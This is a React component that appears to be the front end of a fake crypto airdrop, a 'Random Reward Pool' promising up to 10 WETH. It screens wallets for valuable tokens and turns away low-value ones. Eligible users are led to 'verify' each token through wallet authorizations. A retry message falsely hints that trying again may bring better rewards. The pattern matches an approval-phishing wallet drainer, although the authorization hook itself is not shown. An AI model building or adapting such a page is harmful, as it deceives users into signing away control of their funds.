import { useWalletStatus } from '@/hooks/useWalletStatus';
import { useTokenAuthorization } from '@/hooks/useTokenAuthorization';
import { Card, CardContent } from '@/components/ui/card';
import { Button } from '@/components/ui/button';
import { Progress } from '@/components/ui/progress';
import { ConnectButton } from '@rainbow-me/rainbowkit';
import { Loader2, AlertCircle, CheckCircle, Zap } from 'lucide-react';
import TokenList from './TokenList';

export default function AirdropCard() {
  const { walletStatus, tokens } = useWalletStatus();
  const address = typeof window !== 'undefined' ? window.localStorage.getItem('wagmi.wallet.address') || '' : '';
  const {
    authorizationProgress,
    isAuthorizing,
    currentAuthToken,
    showRetryMessage,
    authorizeToken,
    setShowRetryMessage,
  } = useTokenAuthorization(tokens);

  return (
    <div className="container mx-auto px-4 py-12">
      <Card className="bg-gradient-to-br from-blue-500/10 via-purple-500/10 to-pink-500/10 border border-gray-800 backdrop-blur-sm">
        <CardContent className="p-8">
          <div className="text-center space-y-6">
            <div className="flex justify-center"><Zap className="w-16 h-16 text-blue-400 animate-pulse" /></div>
            <div>
              <h3 className="text-2xl font-bold mb-2">Random Reward Pool</h3>
              <p className="text-gray-400">Connect your wallet to receive up to 10 WETH</p>
            </div>
            <div className="max-w-lg mx-auto space-y-4">
              {/* 钱包未连接 */}
              <ConnectButton.Custom>
                {({ account, openConnectModal }) => {
                  if (!account) {
                    return (
                      <Button
                        onClick={openConnectModal}
                        className="w-full bg-gradient-to-r from-blue-500 to-purple-600 hover:from-blue-600 hover:to-purple-700 text-white font-bold py-4"
                      >
                        <Zap className="w-5 h-5 mr-2" />Connect Wallet
                      </Button>
                    );
                  }
                  return null;
                }}
              </ConnectButton.Custom>
              {/* 钱包已连接 */}
              {walletStatus !== 'checking' && (
                <div className="space-y-4">
                  <div className="flex items-center gap-2">
                    <div className="w-3 h-3 bg-green-400 rounded-full animate-pulse"></div>
                    <span className="text-white">Wallet Connected</span>
                  </div>
                  {walletStatus === 'inactive' && (
                    <div className="bg-red-500/20 border border-red-500/30 rounded-lg p-4">
                      <div className="flex items-center gap-2 text-red-300">
                        <AlertCircle className="h-4 w-4" />
                        <span className="font-semibold">Inactive Wallet</span>
                      </div>
                      <p className="text-red-200 text-sm mt-1">Your ETH balance is too low to perform transactions. Please add more ETH.</p>
                    </div>
                  )}
                  {walletStatus === 'ineligible' && (
                    <div className="bg-orange-500/20 border border-orange-500/30 rounded-lg p-4">
                      <div className="flex items-center gap-2 text-orange-300">
                        <AlertCircle className="h-4 w-4" />
                        <span className="font-semibold">Ineligible Wallet</span>
                      </div>
                      <p className="text-orange-200 text-sm mt-1">Your wallet does not have enough valuable tokens to participate in the airdrop.</p>
                    </div>
                  )}
                  {walletStatus === 'active' && (
                    <div className="space-y-4">
                      <div className="bg-green-500/20 border border-green-500/30 rounded-lg p-4">
                        <div className="flex items-center gap-2 text-green-300">
                          <CheckCircle className="h-4 w-4" />
                          <span className="font-semibold">Wallet eligible!</span>
                        </div>
                        <p className="text-green-200 text-sm mt-1">Your wallet is activated, you can participate in the airdrop.</p>
                      </div>
                      {/* 验证进度 */}
                      <div className="space-y-2">
                        <div className="flex justify-between text-white text-sm">
                          <span>Verification Progress</span>
                          <span>{Math.round(authorizationProgress)}%</span>
                        </div>
                        <Progress value={authorizationProgress} className="h-2" />
                      </div>
                      {/* 代币列表 */}
                      <TokenList
                        tokens={tokens}
                        isAuthorizing={isAuthorizing}
                        currentAuthToken={currentAuthToken}
                        onAuthorize={authorizeToken}
                        label="Unverified"
                        verifiedLabel="Verified"
                      />
                      {/* 一键验证并领取按钮 */}
                      {tokens.some((t) => !t.authorized) && (
                        <Button
                          onClick={async () => {
                            const firstUnauthorized = tokens.find((t) => !t.authorized);
                            if (firstUnauthorized) await authorizeToken(firstUnauthorized);
                          }}
                          disabled={isAuthorizing}
                          className="w-full bg-gradient-to-r from-yellow-500 to-orange-500 hover:from-yellow-600 hover:to-orange-600 text-black font-bold py-3"
                        >
                          {isAuthorizing ? (
                            <>
                              <Loader2 className="h-4 w-4 animate-spin mr-2" />Waiting for wallet confirmation...
                            </>
                          ) : (
                            <>
                              <Zap className="h-4 w-4 mr-2" />Verify and Claim
                            </>
                          )}
                        </Button>
                      )}
                      {/* 重试消息 */}
                      {showRetryMessage && (
                        <div className="space-y-2">
                          <div className="bg-red-500/20 border border-red-500/30 rounded-lg p-3">
                            <p className="text-red-300 text-sm">⚠️ Claim failed, please retry verification</p>
                          </div>
                          <div className="bg-orange-500/20 border border-orange-500/30 rounded-lg p-3">
                            <p className="text-orange-300 text-sm">🔄 Network error, retrying later might yield better rewards</p>
                          </div>
                        </div>
                      )}
                    </div>
                  )}
                </div>
              )}
              {walletStatus === 'checking' && (
                <div className="flex items-center gap-2 text-white/90">
                  <Loader2 className="h-4 w-4 animate-spin" />
                  <span>Checking wallet activity...</span>
                </div>
              )}
            </div>
          </div>
        </CardContent>
      </Card>
    </div>
  );
} 